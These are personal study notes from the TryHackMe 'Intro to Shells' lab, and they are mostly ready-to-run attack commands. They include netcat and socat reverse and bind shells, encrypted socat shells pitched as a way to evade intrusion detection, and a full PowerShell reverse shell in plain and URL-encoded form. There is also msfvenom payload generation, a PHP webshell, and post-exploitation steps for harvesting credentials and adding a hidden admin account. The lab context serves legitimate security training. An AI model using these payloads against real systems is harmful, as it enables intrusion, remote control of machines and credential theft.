#Shell #revshell  #Subscribers #socat 
https://tryhackme.com/room/introtoshells

Before we can get into the intricacies of sending and receiving shells, it's important to understand what a shell actually _is._ In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

## tools 

**Netcat:**

Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.

**Socat:**

Socat is like netcat on steroids. It can do all of the same things, and _many_ more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

There are work arounds to both of these problems, which we will cover later on.
Both Socat and Netcat have .exe versions for use on Windows.

**Metasploit: multi/handler:**

The `exploit/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a _meterpreter_ shell, and is the easiest way to handle _staged_ payloads: both of which we will look at in task 9.

**Msfvenom:**

Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.

## types of shells

At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.

- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a _listener_ which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don't worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.

```
### ------------------ reverse shell
# attacking machine 
sudo nc -nlvp 443

# target 
nc <local IP> <port> -e /bin/bash

### ------------------ bind shell
# attacking machine
nc MACHINE_IP <port>

# target
nc -nlvp <port> -e "cmd.exe"
```

## netcat 

_Reverse Shells_

In the previous task we saw that reverse shells require shellcode and a listener. There are _many_ ways to execute a shell, so we'll start by looking at listeners.

The syntax for starting a netcat listener using Linux is this:

```
nc -lvnp <port-number>

-l    tell netcat that this will be a listener
-v    request a verbose output
-n    tells netcat not to resolve host names or use DNS. 
-p    the port specification will follow.

Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

sudo nc -nlvp 443

## bind shell
nc <target IP> <port>
```

shell stabilization 
```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty -a
stty rows 45; columns 118;

# if shell dies, type  reset 

sudo apt install rlwrap
rlwrap nc -nlvp <port>

sudo python3 -m http.server 80
wget <local IP>/socat -O /tmp/socat     target machine

# powershell
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

```

## socat 

reverse  shell
```
# ----------------- basic reverse shell listener (windows/linux)
socat TCP-L <port> -
nc -nlvp <port>

# windows
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

# linux
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

# ----------------- bind shell
# linux
socat TCP-L:<PORT> EXEC:"bash -li"

# windows
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

socat TCP:<TARGET-IP>:<TARGET-PORT> -

##---------------- stable linux rev shell
# linux (must have socat installed)     -d -d for verbosity
socat TCP-L:<port> FILE:`tty`,raw,echo=0

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

sudo rlwrap nc -nlvp 443

```

- **pty**, allocates a pseudo terminal on the target: part of the stabilization process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.

### socat encrypted shells

One of the many great things about socat is that it's capable of creating encrypted shells: both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

```
# generate a certificate for encrypted shell

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

# this creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. info can be blank or random

cat shell.key shell.crt > shell.pem

# setup rev shell listener (no validation, cert must be on listening machine)

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

# target
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# attacker
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

```

```
What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## common shell payloads 

```
nc -nlvp <port> -e /bin/bash
# rev shell on target
nc <LOCAL-IP> <PORT> -e /bin/bash   

# linux bind shell
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# netcat rev shell
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

```

Windows Powershell reverse shell
- change `('<ip>', <port> ) `
- `sudo nc -nlvp 443`
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>', <port> );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## msfvenom 

Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`). It's this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.

```
msfvenom -p <payload> <options>

#-- windows x64 rev shell
-f           format (exe)
-o           output location
LHOST=<ip>   your/attacker IP
LPORT=<port> your/attacker port

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

### Staged vs Stageless

Before we go any further, there are another two concepts which must be introduced: _**staged**_ reverse shell payloads and _**stageless**_ reverse shell payloads.

- _**Staged**_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts: a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener: usually the Metasploit multi/handler, which will be covered in the next task.  
- _**Stageless**_ payloads are more common: these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

### naming payload

```
<OS>/<architecture>/<payload>

linux/x86/shell_reverse_tcp
windows/shell_reverse_tcp          win32 no arch required
windows/x64/meterpreter/reverse_tcp
linux/x86/meterpreter_reverse_tcp

msfvenom --list payloads
```

```
What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`

msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
```

## metasploit 

Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

```
msfconsole
use multi/handler
options

set PAYLOAD <payload>
set LHOST <listen-address>
set LPORT <listen-port>

exploit -j for background
```

## webshells

There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a _webshell_.

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage: either through a HTML form, or directly as arguments in the URL: which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

```
http://10.10.84.199/uploads/shell.php?cmd=ifconfig
```

would pass in a PHP rev shell code

when target is windows: remote code execution (url encoded)
```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

## next steps

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box.
-  In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

windows
- On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  
- or `C:\xampp\FileZilla Server\FileZilla Server.xml`

```
net user <username> <password> /add
net localgroup administrators <username> /add
```

